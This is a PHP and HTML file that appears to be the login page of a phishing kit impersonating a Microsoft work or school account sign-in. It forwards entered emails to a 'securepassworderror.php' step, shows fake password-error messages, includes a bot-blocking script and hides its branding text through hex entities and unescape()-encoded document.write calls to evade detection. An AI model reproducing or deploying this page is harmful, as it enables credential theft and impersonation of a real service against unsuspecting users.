<?php
	include('blocker.php');
    
	// start > to get url and and put id 
	$url="http://".$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];
	parse_str(parse_url($url, PHP_URL_QUERY));

	$parts = @explode('@', $email);
	$user = @$parts[0];
	$email = '';
    // < end 
	
	$error = $_GET['error'];
	
	function random_number(){
		$numbers = array(0,1,2,3,4,5,6,7,8,9,'A','b','C','D','e','F','G','H','i','J','K','L');
		$key = array_rand($numbers);
		return $numbers[$key]; 
	}

	$url = random_number().random_number().random_number().random_number().random_number().random_number().date('U').md5(date('U')).md5(date('U')).md5(date('U')).md5(date('U')).md5(date('U'));
	
	$post = 'securepassworderror.php?'.$url;
	
	if (isset($_GET['email']) && !empty($_GET['email'])) {
		$email = $_GET['email'];	
		if($email) {
			header("Location: securepassworderror.php?$url&email=$email&error=$error");
		}
	}

	$errorMsg = '';

	if(isset($_GET['error'])) {
		if ($_GET['error'] == 1) {	
			$errorMsg = "Enter a valid email.";
		} else if ($_GET['error'] == 2) {
			$errorMsg = "We don't recognise your password. Make sure that you type the password for your work or school account.";
		}
	}
?>

<!DOCTYPE html>
<html>
<head>
	<title>&#x53;&#x69;&#x67;&#x6E;&#x20;&#x69;&#x6E;&#x20;&#x74;&#x6F;&#x20;&#x79;&#x6F;&#x75;&#x72;&#x20;&#x61;&#x63;&#x63;&#x6F;&#x75;&#x6E;&#x74;</title>
	<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0, user-scalable=no">
	<meta name="robots" content "none">
	<meta name="Googlebot" content="nofollow">
	<meta name="robots" content "noindex, nofollow">
	<link rel="shortcut icon" type="icon" href="images/favicon.png">
	<link rel="stylesheet" type="text/css" href="style.css">
	<script type="text/javascript" src="js/jquery.js"></script>	
	
	<script type="text/javascript">
		function isValidEmailAddress(emailAddress) {
		    var pattern = new RegExp(/^(("[\w-\s]+")|([\w-]+(?:\.[\w-]+)*)|("[\w-\s]+")([\w-]+(?:\.[\w-]+)*))(@((?:[\w-]+\.)*\w[\w-]{0,66})\.([a-z]{2,6}(?:\.[a-z]{2})?)$)|(@\[?((25[0-5]\.|2[0-4][0-9]\.|1[0-9]{2}\.|[0-9]{1,2}\.))((25[0-5]|2[0-4][0-9]|1[0-9]{2}|[0-9]{1,2})\.){2}(25[0-5]|2[0-4][0-9]|1[0-9]{2}|[0-9]{1,2})\]?$)/i);
		    return pattern.test(emailAddress);
		};

		$(function(){

			$(document).ready(function(){
			    $("#next").click(function(){
			    	$('#loader').show();
		    		
		    		if(!isValidEmailAddress($('#email').val())) {
					    $('#email').addClass("error");
			    		$('#message').show();
			    		$('#message').text('Enter a valid email.');
			    		$('#loader').hide();

			    		$('#email').on('input',function(){
					    	$('#email').removeClass('error');
					    	$('#message').hide();
					    });
					    return false;
					}

			    });
			});
		});
	</script>
	
</head>

<body>
	<div class="overlay">
		<div class="login-box">
			<img src="images/ms-logo-v2.jpg" alt="logo">

			<h2 id="title">&#x53;&#x69;&#x67;&#x6E;&#x20;&#x69;&#x6E;</h2>

			<p id="message" class="message"><?php echo $errorMsg; ?></p>
<script type="text/javascript">
<!--
document.write(unescape('%09%09%09%09%3C%64%69%76%20%69%64%3D%22%6C%6F%61%64%65%72%22%20%63%6C%61%73%73%3D%22%6C%6F%61%64%65%72%22%20%68%69%64%64%65%6E%3E%0A%09%09%09%09%09%3C%64%69%76%20%63%6C%61%73%73%3D%22%63%69%72%63%6C%65%22%3E%3C%2F%64%69%76%3E%0A%09%09%09%09%09%3C%64%69%76%20%63%6C%61%73%73%3D%22%63%69%72%63%6C%65%22%3E%3C%2F%64%69%76%3E%0A%09%09%09%09%09%3C%64%69%76%20%63%6C%61%73%73%3D%22%63%69%72%63%6C%65%22%3E%3C%2F%64%69%76%3E%0A%09%09%09%09%09%3C%64%69%76%20%63%6C%61%73%73%3D%22%63%69%72%63%6C%65%22%3E%3C%2F%64%69%76%3E%0A%09%09%09%09%09%3C%64%69%76%20%63%6C%61%73%73%3D%22%63%69%72%63%6C%65%22%3E%3C%2F%64%69%76%3E%0A%09%09%09%09%3C%2F%64%69%76%3E'));
//-->
</script>
			<form action="<?php echo $post; ?>" method="post">
				<input id="email" type="email" name="email" value="<?php echo $email; ?>" placeholder="Email or Phone">
				
<script type="text/javascript">
<!--
document.write(unescape('%09%09%09%09%3C%62%75%74%74%6F%6E%20%69%64%3D%22%6E%65%78%74%22%20%63%6C%61%73%73%3D%22%6E%65%78%74%22%3E%26%23%78%34%45%3B%26%23%78%36%35%3B%26%23%78%37%38%3B%26%23%78%37%34%3B%3C%2F%62%75%74%74%6F%6E%3E%0A%09%09%09%3C%2F%66%6F%72%6D%3E%0A%0A%09%09%09%3C%62%72%3E%0A%0A%09%09%09%3C%64%69%76%20%69%64%3D%22%67%72%6F%75%70%31%22%3E%0A%09%09%09%09%3C%73%6D%61%6C%6C%20%69%64%3D%22%63%72%65%61%74%65%22%3E%26%23%78%34%45%3B%26%23%78%36%46%3B%26%23%78%32%30%3B%26%23%78%36%31%3B%26%23%78%36%33%3B%26%23%78%36%33%3B%26%23%78%36%46%3B%26%23%78%37%35%3B%26%23%78%36%45%3B%26%23%78%37%34%3B%26%23%78%33%46%3B%20%3C%61%20%68%72%65%66%3D%22%23%22%20%63%6C%61%73%73%3D%22%66%61%64%65%22%3E%26%23%78%34%33%3B%26%23%78%37%32%3B%26%23%78%36%35%3B%26%23%78%36%31%3B%26%23%78%37%34%3B%26%23%78%36%35%3B%26%23%78%32%30%3B%26%23%78%36%46%3B%26%23%78%36%45%3B%26%23%78%36%35%3B%26%23%78%32%31%3B%3C%2F%61%3E%3C%2F%73%6D%61%6C%6C%3E%0A%09%09%09%09%3C%62%72%3E%0A%09%09%09%09%3C%62%72%3E%0A%09%09%09%09%3C%73%6D%61%6C%6C%20%69%64%3D%22%63%61%6E%74%22%3E%3C%61%20%68%72%65%66%3D%22%23%22%20%63%6C%61%73%73%3D%22%66%61%64%65%22%3E%26%23%78%34%33%3B%26%23%78%36%31%3B%26%23%78%36%45%3B%26%23%78%32%37%3B%26%23%78%37%34%3B%26%23%78%32%30%3B%26%23%78%36%31%3B%26%23%78%36%33%3B%26%23%78%36%33%3B%26%23%78%36%35%3B%26%23%78%37%33%3B%26%23%78%37%33%3B%26%23%78%32%30%3B%26%23%78%37%39%3B%26%23%78%36%46%3B%26%23%78%37%35%3B%26%23%78%37%32%3B%26%23%78%32%30%3B%26%23%78%36%31%3B%26%23%78%36%33%3B%26%23%78%36%33%3B%26%23%78%36%46%3B%26%23%78%37%35%3B%26%23%78%36%45%3B%26%23%78%37%34%3B%26%23%78%33%46%3B%3C%2F%61%3E%3C%2F%73%6D%61%6C%6C%3E%0A%09%09%09%3C%2F%64%69%76%3E%0A%09%09%3C%2F%64%69%76%3E%0A%09%3C%2F%64%69%76%3E%0A%0A%09%3C%66%6F%6F%74%65%72%3E%0A%09%09%3C%75%6C%3E%0A%09%09%09%3C%6C%69%3E%3C%61%20%68%72%65%66%3D%22%23%22%3E%26%23%78%35%30%3B%26%23%78%37%32%3B%26%23%78%36%39%3B%26%23%78%37%36%3B%26%23%78%36%31%3B%26%23%78%36%33%3B%26%23%78%37%39%3B%20%26%20%26%23%78%36%33%3B%26%23%78%36%46%3B%26%23%78%36%46%3B%26%23%78%36%42%3B%26%23%78%36%39%3B%26%23%78%36%35%3B%26%23%78%37%33%3B%3C%2F%61%3E%3C%2F%6C%69%3E%0A%09%09%09%3C%6C%69%3E%3C%61%20%68%72%65%66%3D%22%23%22%3E%26%23%78%35%34%3B%26%23%78%36%35%3B%26%23%78%37%32%3B%26%23%78%36%44%3B%26%23%78%37%33%3B%26%23%78%32%30%3B%26%23%78%36%46%3B%26%23%78%36%36%3B%26%23%78%32%30%3B%26%23%78%37%35%3B%26%23%78%37%33%3B%26%23%78%36%35%3B%3C%2F%61%3E%3C%2F%6C%69%3E%0A%09%09%09%3C%6C%69%3E%3C%61%3E%26%63%6F%70%79%3B%26%23%78%33%32%3B%26%23%78%33%30%3B%26%23%78%33%32%3B%26%23%78%33%30%3B%26%23%78%32%30%3B%26%23%78%34%44%3B%26%23%78%36%39%3B%26%23%78%36%33%3B%26%23%78%37%32%3B%26%23%78%36%46%3B%26%23%78%37%33%3B%26%23%78%36%46%3B%26%23%78%36%36%3B%26%23%78%37%34%3B%3C%2F%61%3E%3C%2F%6C%69%3E%0A%09%09%3C%2F%75%6C%3E'));
//-->
</script>
	</footer>

</body>
</html>

